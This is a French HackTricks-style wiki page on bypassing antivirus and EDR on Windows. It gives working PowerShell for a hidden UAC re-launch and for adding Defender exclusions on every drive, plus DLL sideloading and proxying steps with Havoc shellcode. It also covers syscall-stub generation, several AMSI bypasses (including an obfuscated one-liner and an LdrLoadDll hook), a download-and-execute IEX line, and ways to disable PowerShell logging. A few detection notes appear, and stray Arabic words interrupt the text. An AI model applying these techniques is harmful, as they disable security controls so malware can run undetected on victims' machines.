# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Cette page a initialement été rédigée par** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Un outil pour arrêter Windows Defender.
- [no-defender](https://github.com/es3n1n/no-defender): Un outil pour arrêter Windows Defender en faisant passer cela pour un autre AV.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Leurre UAC de style installateur avant de modifier Defender

Les loaders publics qui se font passer pour des cheats de jeu sont souvent fournis sous forme d'installateurs Node.js/Nexe non signés qui, d'abord, **demandent à l'utilisateur une élévation** puis neutralisent Defender. Le flux est simple :

1. Vérifier le contexte administratif avec `net session`. La commande ne réussit que lorsque l'appelant dispose des droits admin, donc un échec indique que le loader s'exécute avec un utilisateur standard.
2. Se relancer immédiatement avec le verbe `RunAs` pour déclencher l'invite UAC de consentement attendue tout en conservant la ligne de commande d'origine.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Les victimes pensent déjà installer un logiciel « cracked », donc l’invite est généralement acceptée, donnant au malware les droits dont il a besoin pour modifier la policy de Defender.

### Blanket `MpPreference` exclusions for every drive letter

Une fois élevé, les chaînes de type GachiLoader maximisent les angles morts de Defender au lieu de désactiver le service directement. Le loader tue d’abord le watchdog GUI (`taskkill /F /IM SecHealthUI.exe`), puis pousse des **exclusions extrêmement larges** afin que chaque profil utilisateur, répertoire système et disque amovible devienne impossible à scanner :
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Observations clés :

- La boucle parcourt chaque système de fichiers monté (D:\, E:\, clés USB, etc.) donc **tout payload futur déposé n’importe où sur le disque est ignoré**.
- L’exclusion de l’extension `.sys` est tournée vers l’avenir — les attaquants gardent la possibilité de charger plus tard des drivers non signés sans retoucher Defender.
- Toutes les modifications sont enregistrées sous `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, ce qui permet aux étapes ultérieures de vérifier que les exclusions persistent ou de les étendre sans réactiver l’UAC.

Comme aucun service Defender n’est arrêté, les contrôles de santé naïfs continuent de signaler « antivirus active » même si l’inspection en temps réel ne touche jamais ces chemins.

## **AV Evasion Methodology**

Actuellement, les AV utilisent différentes méthodes pour vérifier si un fichier est malveillant ou non : détection statique, analyse dynamique et, pour les EDR plus avancés, analyse comportementale.

### **Static detection**

La détection statique consiste à signaler des chaînes malveillantes connues ou des tableaux d’octets dans un binaire ou un script, et aussi à extraire des informations du fichier lui-même (par exemple la description du fichier, le nom de l’entreprise, les signatures numériques, l’icône, le checksum, etc.). Cela signifie que l’utilisation d’outils publics connus peut vous faire repérer plus facilement, puisqu’ils ont probablement déjà été analysés et signalés comme malveillants. Il existe plusieurs façons de contourner ce type de détection :

- **Encryption**

Si vous chiffrez le binaire, l’AV ne pourra pas détecter votre programme, mais il vous faudra une sorte de loader pour déchiffrer et exécuter le programme en mémoire.

- **Obfuscation**

Parfois, il suffit de modifier quelques chaînes dans votre binaire ou script pour le faire passer devant l’AV, mais cela peut prendre du temps selon ce que vous essayez d’obfusquer.

- **Custom tooling**

Si vous développez vos propres outils, il n’y aura pas de signatures malveillantes connues, mais cela demande beaucoup de temps et d’efforts.

> [!TIP]
> Une bonne méthode pour vérifier la détection statique par Windows Defender est [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Il découpe en gros le fichier en plusieurs segments puis demande à Defender de les analyser un par un ; ainsi, il peut vous dire exactement quelles chaînes ou quels octets sont signalés dans votre binaire.

Je vous recommande vivement de consulter cette [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) sur l’AV Evasion pratique.

### **Dynamic analysis**

L’analyse dynamique, c’est lorsque l’AV exécute votre binaire dans un sandbox et surveille les activités malveillantes (par exemple tenter de déchiffrer et lire les mots de passe de votre navigateur, effectuer un minidump de LSASS, etc.). Cette partie peut être un peu plus difficile à contourner, mais voici quelques choses que vous pouvez faire pour éviter les sandboxes.

- **Sleep before execution** Selon son implémentation, cela peut être un excellent moyen de contourner l’analyse dynamique de l’AV. Les AV ont très peu de temps pour analyser les fichiers afin de ne pas interrompre le flux de travail de l’utilisateur, donc de longues pauses peuvent perturber l’analyse des binaires. Le problème, c’est que beaucoup de sandboxes d’AV peuvent simplement ignorer le sleep selon son implémentation.
- **Checking machine's resources** En général, les sandboxes disposent de très peu de ressources (par exemple < 2GB RAM), sinon elles pourraient ralentir la machine de l’utilisateur. Vous pouvez aussi être très créatif ici, par exemple en vérifiant la température du CPU ou même la vitesse des ventilateurs ; tout ne sera pas implémenté dans le sandbox.
- **Machine-specific checks** Si vous voulez cibler un utilisateur dont la workstation est jointe au domaine "contoso.local", vous pouvez vérifier le domaine de l’ordinateur pour voir s’il correspond à celui que vous avez spécifié ; si ce n’est pas le cas, vous pouvez faire quitter votre programme.

Il s’avère que le nom de machine du Sandbox de Microsoft Defender est HAL9TH, donc vous pouvez vérifier le nom de l’ordinateur dans votre malware avant la détonation ; si le nom correspond à HAL9TH, cela signifie que vous êtes dans le sandbox de defender, donc vous pouvez faire quitter votre programme.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Quelques autres très bons conseils de [@mgeeky](https://twitter.com/mariuszbit) pour aller contre les Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Comme nous l’avons déjà dit dans ce post, les **public tools** finiront par être **detected**, donc vous devriez vous poser une question :

Par exemple, si vous voulez dumper LSASS, **avez-vous vraiment besoin d’utiliser mimikatz** ? Ou pourriez-vous utiliser un autre projet moins connu qui dumpe aussi LSASS.

La bonne réponse est probablement la seconde. En prenant mimikatz comme exemple, c’est probablement l’un des morceaux de malware les plus signalés, si ce n’est le plus signalé, par les AV et les EDR ; même si le projet est super cool, c’est aussi un cauchemar à utiliser pour contourner les AV, donc cherchez simplement des alternatives pour ce que vous essayez d’accomplir.

> [!TIP]
> Quand vous modifiez vos payloads pour l’évasion, assurez-vous de **désactiver l’envoi automatique d’échantillons** dans defender, et s’il vous plaît, sérieusement, **NE TÉLÉCHARGEZ PAS SUR VIRUSTOTAL** si votre objectif est d’obtenir une évasion sur le long terme. Si vous voulez vérifier si votre payload est détecté par un AV particulier, installez-le sur une VM, essayez de désactiver l’envoi automatique d’échantillons, et testez-le là-bas jusqu’à obtenir le résultat souhaité.

## EXEs vs DLLs

Chaque fois que c’est possible, **privilégiez toujours l’utilisation des DLLs pour l’évasion**, d’après mon expérience, les fichiers DLL sont en général **beaucoup moins détectés** et analysés, donc c’est une astuce très simple à utiliser pour éviter la détection dans certains cas (si votre payload peut bien sûr s’exécuter en tant que DLL).

Comme on peut le voir sur cette image, un payload DLL de Havoc a un taux de détection de 4/26 sur antiscan.me, alors que le payload EXE a un taux de détection de 7/26.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>comparaison antiscan.me d’un payload Havoc EXE normal vs un Havoc DLL normal</p></figcaption></figure>

Nous allons maintenant montrer quelques astuces que vous pouvez utiliser avec les fichiers DLL pour être beaucoup plus stealthier.

## DLL Sideloading & Proxying

Le **DLL Sideloading** exploite l’ordre de recherche des DLL utilisé par le loader en plaçant côte à côte l’application victime et le ou les payloads malveillants.

Vous pouvez rechercher des programmes vulnérables au DLL Sideloading avec [Siofra](https://github.com/Cybereason/siofra) et le script powershell suivant :
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Cette commande affichera la liste des programmes susceptibles de DLL hijacking dans "C:\Program Files\\" et les fichiers DLL qu'ils essaient de charger.

Je recommande vivement d’**explorer vous-même les programmes DLL Hijackable/Sideloadable**, cette technique est assez furtive si elle est bien réalisée, mais si vous utilisez des programmes DLL Sideloadable publiquement connus, vous pourriez vous faire attraper facilement.

Le simple fait de placer une DLL malveillante avec le nom qu’un programme s’attend à charger ne chargera pas votre payload, car le programme attend certaines fonctions spécifiques à l’intérieur de cette DLL ; pour résoudre ce problème, nous utiliserons une autre technique appelée **DLL Proxying/Forwarding**.

**DLL Proxying** relaie les appels qu’un programme effectue depuis la DLL proxy (et malveillante) vers la DLL originale, préservant ainsi la fonctionnalité du programme tout en permettant de gérer l’exécution de votre payload.

J’utiliserai le projet [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Voici les étapes que j’ai suivies :
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
La dernière commande nous donnera 2 fichiers : un modèle de code source DLL, et la DLL originale renommée.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Voici les résultats :

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

À la fois notre shellcode (encodé avec [SGN](https://github.com/EgeBalci/sgn)) et le proxy DLL ont un taux de détection de 0/26 sur [antiscan.me](https://antiscan.me) ! J’appellerais ça un succès.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Je **recommande fortement** de regarder le VOD Twitch de [S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sur le DLL Sideloading ainsi que la [vidéo d'ippsec](https://www.youtube.com/watch?v=3eROsG_WNpE) pour en savoir plus sur ce que nous avons abordé plus en détail.

### Abusing Forwarded Exports (ForwardSideLoading)

Les modules PE Windows peuvent exporter des fonctions qui sont en réalité des "forwarders" : au lieu de pointer vers du code, l’entrée d’export contient une chaîne ASCII de la forme `TargetDll.TargetFunc`. Lorsqu’un appelant résout l’export, le loader Windows va :

- Charger `TargetDll` s’il n’est pas déjà chargé
- Résoudre `TargetFunc` depuis celui-ci

Comportements clés à comprendre :
- Si `TargetDll` est un KnownDLL, il est fourni depuis l’espace de noms protégé KnownDLLs (par ex., ntdll, kernelbase, ole32).
- Si `TargetDll` n’est pas un KnownDLL, l’ordre normal de recherche des DLL est utilisé, ce qui inclut le répertoire du module qui effectue la résolution du forward.

Cela permet une primitive indirecte de sideloading : trouver une DLL signée qui exporte une fonction forwardée vers un nom de module non-KnownDLL, puis placer cette DLL signée avec une DLL contrôlée par l’attaquant nommée exactement comme le module cible forwardé. عندما l’export forwardé est invoqué, le loader résout le forward et charge votre DLL depuis le même répertoire, exécutant votre DllMain.

Exemple observé sur Windows 11 :
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` n'est pas un KnownDLL, donc il est résolu via l'ordre de recherche normal.

PoC (copier-coller) :
1) Copier la DLL système signée vers un dossier inscriptible
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Déposez un `NCRYPTPROV.dll` malveillant dans le même dossier. Un DllMain minimal suffit pour obtenir l’exécution de code ; vous n’avez pas besoin d’implémenter la fonction transmise pour déclencher DllMain.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Déclencher le transfert avec un LOLBin signé :
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Comportement observé :
- rundll32 (signé) charge le side-by-side `keyiso.dll` (signé)
- Lors de la résolution de `KeyIsoSetAuditingInterface`, le loader suit le forward vers `NCRYPTPROV.SetAuditingInterface`
- Le loader charge alors `NCRYPTPROV.dll` depuis `C:\test` et exécute son `DllMain`
- Si `SetAuditingInterface` n’est pas implémentée, vous obtiendrez une erreur "missing API" seulement après que `DllMain` ait déjà été exécuté

Conseils de chasse :
- Concentrez-vous sur les forwarded exports où le module cible n’est pas un KnownDLL. Les KnownDLLs sont listés sous `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Vous pouvez énumérer les forwarded exports avec des outils tels que :
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Voir l’inventaire forwarder de Windows 11 pour rechercher des candidats : https://hexacorn.com/d/apis_fwd.txt

Idées de détection/défense :
- Surveiller les LOLBins (par ex. rundll32.exe) chargeant des DLL signées depuis des chemins non-système, suivies du chargement de non-KnownDLLs avec le même nom de base depuis ce répertoire
- Déclencher une alerte sur des chaînes process/module comme : `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` sous des chemins inscriptibles par l’utilisateur
- Imposer des politiques d’intégrité du code (WDAC/AppLocker) et refuser write+execute dans les répertoires d’application

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Vous pouvez utiliser Freeze pour charger et exécuter votre shellcode de manière furtive.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> L’évasion est juste un jeu du chat et de la souris ; ce qui fonctionne aujourd’hui peut être détecté demain, donc ne comptez jamais sur un seul outil, et si possible, essayez d’enchaîner plusieurs techniques d’évasion.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

Les EDR placent souvent des **user-mode inline hooks** sur les stubs `syscall` de `ntdll.dll`. Pour contourner ces hooks, vous pouvez générer des stubs de syscall **directs** ou **indirects** qui chargent le bon **SSN** (System Service Number) et basculent en mode kernel sans exécuter le point d’entrée exporté hooké.

**Options d’invocation :**
- **Direct (embedded)** : émet une instruction `syscall`/`sysenter`/`SVC #0` dans le stub généré (aucun appel à l’export `ntdll`).
- **Indirect** : saute vers un gadget `syscall` existant dans `ntdll` afin que la transition kernel semble provenir de `ntdll` (utile pour l’évasion heuristique) ; **randomized indirect** choisit un gadget dans un pool à chaque appel.
- **Egg-hunt** : évite d’embarquer la séquence d’opcodes statique `0F 05` sur le disque ; résout une séquence `syscall` à l’exécution.

**Stratégies de résolution du SSN résistantes aux hooks :**
- **FreshyCalls (VA sort)** : infère les SSN en triant les stubs `syscall` par adresse virtuelle au lieu de lire les octets du stub.
- **SyscallsFromDisk** : mappe un `\KnownDlls\ntdll.dll` propre, lit les SSN depuis son `.text`, puis le démonte (contourne tous les hooks en mémoire).
- **RecycledGate** : combine l’inférence du SSN triée par VA avec la validation des opcodes lorsqu’un stub est propre ; retombe sur l’inférence VA si le stub est hooké.
- **HW Breakpoint** : place DR0 sur l’instruction `syscall` et utilise un VEH pour capturer le SSN depuis `EAX` à l’exécution, sans parser les octets hookés.

Exemple d’utilisation de SysWhispers4 :
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI a été créé pour empêcher les "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)". Au départ, les AV n’étaient capables d’analyser que les **fichiers sur le disque**, donc si vous pouviez exécuter des payloads **directement en mémoire**, l’AV ne pouvait rien faire pour l’empêcher, car il n’avait pas assez de visibilité.

La fonctionnalité AMSI est intégrée dans ces composants de Windows.

- User Account Control, ou UAC (élévation de EXE, COM, MSI, ou installation ActiveX)
- PowerShell (scripts, utilisation interactive et évaluation de code dynamique)
- Windows Script Host (wscript.exe et cscript.exe)
- JavaScript et VBScript
- Office VBA macros

Elle permet aux solutions antivirus d’inspecter le comportement des scripts en exposant le contenu des scripts sous une forme à la fois non chiffrée et non obfusquée.

Exécuter `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produira l’alerte suivante sur Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Remarquez comment il ajoute le préfixe `amsi:` puis le chemin vers l’exécutable depuis lequel le script a été lancé, dans ce cas, powershell.exe

Nous n’avons déposé aucun fichier sur le disque, mais nous avons quand même été détectés en mémoire à cause de AMSI.

De plus, à partir de **.NET 4.8**, le code C# est également exécuté via AMSI. Cela affecte même `Assembly.Load(byte[])` pour le chargement et l’exécution en mémoire. C’est pourquoi l’utilisation de versions plus anciennes de .NET (comme 4.7.2 ou inférieures) est recommandée pour l’exécution en mémoire si vous voulez contourner AMSI.

Il existe plusieurs façons de contourner AMSI :

- **Obfuscation**

Comme AMSI fonctionne principalement avec des détections statiques, modifier les scripts que vous essayez de charger peut être une bonne manière d’échapper à la détection.

Cependant, AMSI a la capacité de désobfusquer des scripts même s’ils ont plusieurs couches, donc l’obfuscation peut être une mauvaise option selon la manière dont elle est faite. Cela rend l’évasion moins simple. Cela dit, parfois, tout ce que vous avez à faire est de changer quelques noms de variables et ce sera suffisant, donc cela dépend de la gravité du flagging.

- **AMSI Bypass**

Puisque AMSI est implémenté en chargeant une DLL dans le processus powershell (ainsi que cscript.exe, wscript.exe, etc.), il est possible de le modifier facilement même en s’exécutant en tant qu’utilisateur non privilégié. À cause de cette faille dans l’implémentation de AMSI, des chercheurs ont trouvé plusieurs façons d’échapper au scan AMSI.

**Forcer une erreur**

Forcer l’échec de l’initialisation AMSI (amsiInitFailed) fera en sorte qu’aucun scan ne soit lancé pour le processus actuel. À l’origine, cela a été divulgué par [Matt Graeber](https://twitter.com/mattifestation) et Microsoft a développé une signature pour empêcher une utilisation plus large.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Tout ce qu’il a fallu, c’est une ligne de code powershell pour rendre AMSI inutilisable pour le processus powershell en cours. Cette ligne a bien sûr été signalée par AMSI lui-même, donc une modification est nécessaire afin d’utiliser cette technique.

Voici un AMSI bypass modifié que j’ai pris de ce [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.

**Memory Patching**

Cette technique a été initialement découverte par [@RastaMouse](https://twitter.com/_RastaMouse/) et consiste à trouver l'adresse de la fonction "AmsiScanBuffer" dans amsi.dll (responsable de l’analyse de l’entrée fournie par l’utilisateur) puis à l’écraser avec des instructions qui renvoient le code E_INVALIDARG ; de cette façon, le résultat de l’analyse réelle renverra 0, ce qui est interprété comme un résultat propre.

> [!TIP]
> Veuillez lire [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) pour une explication plus détaillée.

Il existe également de nombreuses autres techniques utilisées pour bypass AMSI avec powershell, consultez [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) et [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) pour en savoir plus.

### Blocker AMSI en empêchant le chargement de amsi.dll (hook LdrLoadDll)

AMSI est initialisé uniquement après le chargement de `amsi.dll` dans le processus actuel. Un bypass robuste, indépendant du langage, consiste à placer un hook en mode utilisateur sur `ntdll!LdrLoadDll` qui renvoie une erreur lorsque le module demandé est `amsi.dll`. En conséquence, AMSI ne se charge jamais et aucune analyse n’a lieu pour ce processus.

Aperçu de l’implémentation (pseudo-code x64 C/C++) :
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notes
- Fonctionne avec PowerShell, WScript/CScript et des custom loaders de la même manière (tout ce qui chargerait autrement AMSI).
- À associer avec l’envoi de scripts via stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) pour éviter de longs artefacts de ligne de commande.
- Vu utilisé par des loaders exécutés via des LOLBins (par ex., `regsvr32` appelant `DllRegisterServer`).

L’outil **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** génère également un script pour bypass AMSI.
L’outil **[https://amsibypass.com/](https://amsibypass.com/)** génère également un script pour bypass AMSI qui évite les signatures grâce à des fonctions, variables et expressions de caractères user-defined aléatoires, et applique une casse aléatoire aux mots-clés PowerShell pour éviter la signature.

**Remove the detected signature**

Vous pouvez utiliser un outil comme **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** et **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** pour retirer la signature AMSI détectée de la mémoire du processus courant. Cet outil fonctionne en analysant la mémoire du processus courant à la recherche de la signature AMSI, puis en l’écrasant avec des instructions NOP, la supprimant ainsi effectivement de la mémoire.

**AV/EDR products that uses AMSI**

Vous pouvez trouver une liste de produits AV/EDR qui utilisent AMSI dans **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**Use Powershell version 2**
Si vous utilisez la version 2 de PowerShell, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysés par AMSI. Vous pouvez faire ceci :
```bash
powershell.exe -version 2
```
## PS Logging

La journalisation PowerShell est une fonctionnalité qui permet d’enregistrer toutes les commandes PowerShell exécutées sur un système. Cela peut être utile à des fins d’audit et de dépannage, mais cela peut aussi être un **problème pour les attaquants qui veulent échapper à la détection**.

Pour contourner la journalisation PowerShell, vous pouvez utiliser les techniques suivantes :

- **Disable PowerShell Transcription and Module Logging** : Vous pouvez utiliser un outil tel que [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) à cette fin.
- **Use Powershell version 2** : Si vous utilisez PowerShell version 2, AMSI ne sera pas chargé, vous pouvez donc exécuter vos scripts sans être analysé par AMSI. Vous pouvez faire ceci : `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session** : Utilisez [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) pour lancer un powershell sans défenses (c’est ce que `powerpick` de Cobal Strike utilise).


## Obfuscation

> [!TIP]
> Plusieurs techniques d’obfuscation reposent sur le chiffrement des données, ce qui augmentera l’entropie du binaire et facilitera sa détection par les AVs et les EDRs. Faites attention à cela et envisagez peut-être de chiffrer uniquement des sections spécifiques de votre code qui sont sensibles ou doivent être masquées.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Lors de l’analyse de malware qui utilise ConfuserEx 2 (ou des forks commerciaux), il est courant de rencontrer plusieurs couches de protection qui bloquent les décompilateurs et les sandboxes. Le workflow ci-dessous restaure de manière fiable un **IL presque original** qui peut ensuite être décompilé en C# dans des outils tels que dnSpy ou ILSpy.

1.  Suppression de l’anti-tampering – ConfuserEx chiffre chaque *method body* et le déchiffre dans le constructeur statique du *module* (`<Module>.cctor`). Cela corrige aussi le checksum PE, donc toute modification fera crasher le binaire. Utilisez **AntiTamperKiller** pour localiser les tables de métadonnées chiffrées, récupérer les clés XOR et réécrire un assembly propre :
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
La sortie contient les 6 paramètres anti-tamper (`key0-key3`, `nameHash`, `internKey`) qui peuvent être utiles pour construire votre propre unpacker.

2.  Récupération des symboles / du control-flow – fournissez le fichier *clean* à **de4dot-cex** (un fork de de4dot compatible avec ConfuserEx).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags :
• `-p crx` – sélectionne le profil ConfuserEx 2
• de4dot annulera le flattening du control-flow, restaurera les namespaces, classes et noms de variables d’origine et déchiffrera les chaînes constantes.

3.  Suppression des proxy-call – ConfuserEx remplace les appels de méthode directs par des wrappers légers (a.k.a *proxy calls*) pour compliquer davantage la décompilation. Supprimez-les avec **ProxyCall-Remover** :
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Après cette étape, vous devriez voir des API .NET normales telles que `Convert.FromBase64String` ou `AES.Create()` au lieu de fonctions wrapper opaques (`Class8.smethod_10`, …).

4.  Nettoyage manuel – exécutez le binaire résultant dans dnSpy, recherchez de gros blobs Base64 ou l’utilisation de `RijndaelManaged`/`TripleDESCryptoServiceProvider` pour localiser le *real* payload. Souvent, le malware le stocke sous forme de tableau d’octets encodé en TLV initialisé dans `<Module>.byte_0`.

La chaîne ci-dessus restaure le flux d’exécution **sans** avoir besoin d’exécuter l’échantillon malveillant – utile lorsque vous travaillez sur un poste hors ligne.

> 🛈  ConfuserEx produit un attribut personnalisé nommé `ConfusedByAttribute` qui peut être utilisé comme IOC pour trier automatiquement les échantillons.

#### One-liner
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: obfuscateur C#**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): L'objectif de ce projet est de fournir un fork open-source de la suite de compilation [LLVM](http://www.llvm.org/) capable d'améliorer la sécurité logicielle grâce à l'[obfuscation de code](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) et au renforcement ضد la modification.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator démontre comment utiliser le langage `C++11/14` pour générer, au moment de la compilation, du code obfusqué sans utiliser d'outil externe et sans modifier le compilateur.
- [**obfy**](https://github.com/fritzone/obfy): Ajoute une couche d'opérations obfusquées générées par le framework de méta-programmation de modèles C++, ce qui rendra un peu plus difficile la tâche de la personne voulant craquer l'application.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz est un obfuscateur de binaires x64 capable d'obfusquer divers fichiers pe, notamment : .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame est un moteur simple de code métamorphique pour exécutables arbitraires.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator est un framework d'obfuscation de code granulaire pour les langages pris en charge par LLVM, utilisant ROP (return-oriented programming). ROPfuscator obfusque un programme au niveau du code assembleur en transformant des instructions normales en chaînes ROP, contrecarrant notre conception naturelle du flot de contrôle normal.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt est un crypter .NET PE écrit en Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor peut convertir des EXE/DLL existants en shellcode puis les charger

## SmartScreen & MoTW

Vous avez peut-être vu cet écran lors du téléchargement de certains exécutables depuis internet et de leur exécution.

